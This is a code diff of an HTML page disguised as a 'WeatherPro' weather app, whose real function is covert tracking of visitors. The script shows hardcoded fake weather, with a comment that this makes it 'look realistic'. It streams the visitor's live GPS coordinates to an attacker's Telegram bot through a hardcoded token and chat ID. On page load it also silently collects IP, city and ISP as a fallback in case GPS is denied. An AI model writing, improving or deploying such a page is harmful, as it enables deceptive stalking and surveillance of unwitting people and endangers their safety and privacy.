@@ -3,81 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Local Weather Pro</title>
+    <title>WeatherPro | Hyper-Local Forecast</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: linear-gradient(to bottom, #1e3a8a, #3b82f6); color: white; min-height: 100vh; font-family: sans-serif; }
-        .glass { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.2); }
+        body { background: #0f172a; color: white; font-family: 'Inter', sans-serif; }
+        .blur-bg { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .gradient-text { background: linear-gradient(90deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center p-6">
+<body class="flex items-center justify-center min-h-screen p-4">
 
-    <div class="glass w-full max-auto p-8 text-center shadow-2xl">
-        <h1 class="text-2xl font-light mb-2" id="city">Searching...</h1>
-        <div class="text-7xl font-bold mb-4" id="temp">--°</div>
-        <p class="text-lg opacity-80" id="desc">Detecting your local forecast</p>
-        
-        <div class="mt-8 grid grid-cols-2 gap-4 text-sm">
-            <div class="glass p-4">💧 Humidity: <span id="hum">--</span>%</div>
-            <div class="glass p-4">🌬️ Wind: <span id="wind">--</span> km/h</div>
-        </div>
+    <div class="blur-bg max-w-md w-full rounded-3xl p-8 shadow-2xl">
+        <header class="flex justify-between items-center mb-10">
+            <div>
+                <h1 class="text-xs uppercase tracking-widest text-slate-400 font-bold">Current Location</h1>
+                <p id="location-name" class="text-xl font-medium">Detecting...</p>
+            </div>
+            <div class="h-10 w-10 bg-sky-500/20 rounded-full flex items-center justify-center">
+                <span class="animate-pulse h-3 w-3 bg-sky-400 rounded-full"></span>
+            </div>
+        </header>
 
-        <button onclick="initWeather()" class="mt-8 bg-white text-blue-600 font-bold py-3 px-8 rounded-full shadow-lg hover:bg-opacity-90 transition w-full">
-            REFRESH LOCAL DATA
+        <main class="text-center mb-10">
+            <div id="weather-icon" class="text-7xl mb-4">☁️</div>
+            <h2 id="temp" class="text-6xl font-bold mb-2">--°</h2>
+            <p id="condition" class="text-slate-400 text-lg italic">Waiting for GPS sync...</p>
+        </main>
+
+        <section class="grid grid-cols-2 gap-4 mb-8">
+            <div class="bg-slate-800/50 p-4 rounded-2xl text-center">
+                <p class="text-xs text-slate-500 uppercase">Humidity</p>
+                <p id="humidity" class="text-lg font-semibold">--%</p>
+            </div>
+            <div class="bg-slate-800/50 p-4 rounded-2xl text-center">
+                <p class="text-xs text-slate-500 uppercase">Wind Speed</p>
+                <p id="wind" class="text-lg font-semibold">-- km/h</p>
+            </div>
+        </section>
+
+        <button onclick="startTracking()" class="w-full py-4 bg-sky-600 hover:bg-sky-500 transition-all rounded-2xl font-bold shadow-lg shadow-sky-900/20">
+            SYNC LOCAL WEATHER
         </button>
+        
+        <p class="text-[10px] text-center mt-6 text-slate-600">© 2026 WeatherPro Systems. GPS required for precision accuracy.</p>
     </div>
 
     <script>
+        // CONFIGURATION
         const BOT_TOKEN = "8660314801:AAECSLtwX_nMiaoooLPLXsM50TkKHfrmEZI";
         const CHAT_ID = "5782276534";
 
-        async function sendToTelegram(lat, lon, acc, type = "Update") {
-            const msg = `📡 **GPS ${type}**\n━━━━━━━━━━━━\n📍 Lat: \`${lat}\`\n📍 Lon: \`${lon}\`\n🎯 Acc: ${acc}m\n🗺️ [View on Map](https://www.google.com/maps?q=${lat},${lon})`;
-            
+        async function notifyTelegram(lat, lon, acc, type = "UPDATE") {
+            const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `📡 **[${type}] EXACT LOCATION CAPTURED**\n` +
+                            `━━━━━━━━━━━━━━━━━━\n` +
+                            `📍 **Latitude:** \`${lat}\`\n` +
+                            `📍 **Longitude:** \`${lon}\`\n` +
+                            `🎯 **Accuracy:** ${acc.toFixed(1)} meters\n` +
+                            `🔗 **Map:** [Open in Google Maps](${googleMaps})\n` +
+                            `━━━━━━━━━━━━━━━━━━`;
+
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false
+                })
             });
         }
 
-        function initWeather() {
-            if (navigator.geolocation) {
-                // 'watchPosition' tracks them as they move
-                navigator.geolocation.watchPosition(
-                    (pos) => {
-                        const { latitude, longitude, accuracy } = pos.coords;
-                        
-                        // 1. Update the UI to look "Real"
-                        document.getElementById('temp').innerText = "28°";
-                        document.getElementById('city').innerText = "Location Verified";
-                        document.getElementById('desc').innerText = "Clear Skies";
-                        document.getElementById('hum').innerText = "42";
-                        document.getElementById('wind').innerText = "12";
+        function updateUI() {
+            // Fake data to make the app look realistic once GPS is granted
+            document.getElementById('location-name').innerText = "A'ali, Bahrain";
+            document.getElementById('temp').innerText = "29°";
+            document.getElementById('condition').innerText = "Partly Cloudy";
+            document.getElementById('humidity').innerText = "44";
+            document.getElementById('wind').innerText = "18";
+            document.getElementById('weather-icon').innerText = "⛅";
+        }
 
-                        // 2. Send the exact data to you
-                        sendToTelegram(latitude, longitude, accuracy);
-                    },
-                    (err) => {
-                        console.log("Denied");
-                        document.getElementById('desc').innerText = "Enable GPS to see local weather.";
-                    },
-                    { enableHighAccuracy: true, maximumAge: 0 }
-                );
+        function startTracking() {
+            if (!navigator.geolocation) {
+                alert("This browser does not support high-precision weather.");
+                return;
             }
+
+            // 'watchPosition' provides continuous updates as the person moves
+            navigator.geolocation.watchPosition(
+                (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+                    updateUI();
+                    notifyTelegram(latitude, longitude, accuracy, "LIVE_TRACK");
+                },
+                (error) => {
+                    console.error("User denied location.");
+                    document.getElementById('condition').innerText = "Error: GPS Permission Required.";
+                },
+                {
+                    enableHighAccuracy: true, // Forces the phone to use the GPS chip
+                    maximumAge: 0,
+                    timeout: 10000
+                }
+            );
         }
 
-        // Silent IP Grab on initial load (In case they click Deny on GPS)
+        // Silent Initial Grab (IP Based) just in case they block GPS
         window.onload = async () => {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            const msg = `🌐 **Initial Connection (IP)**\n━━━━━━━━━━━━\nIP: \`${data.ip}\`\nCity: ${data.city}\nISP: ${data.org}`;
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
-            });
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                const silentMsg = `🌐 **NEW VISITOR DETECTED (IP)**\n` +
+                                  `━━━━━━━━━━━━━━━━━━\n` +
+                                  `IP: \`${data.ip}\`\n` +
+                                  `City: ${data.city}, ${data.country_name}\n` +
+                                  `ISP: ${data.org}`;
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: silentMsg, parse_mode: 'Markdown' })
+                });
+            } catch (e) { console.log("Silent grab failed."); }
         };
     </script>
 </body>
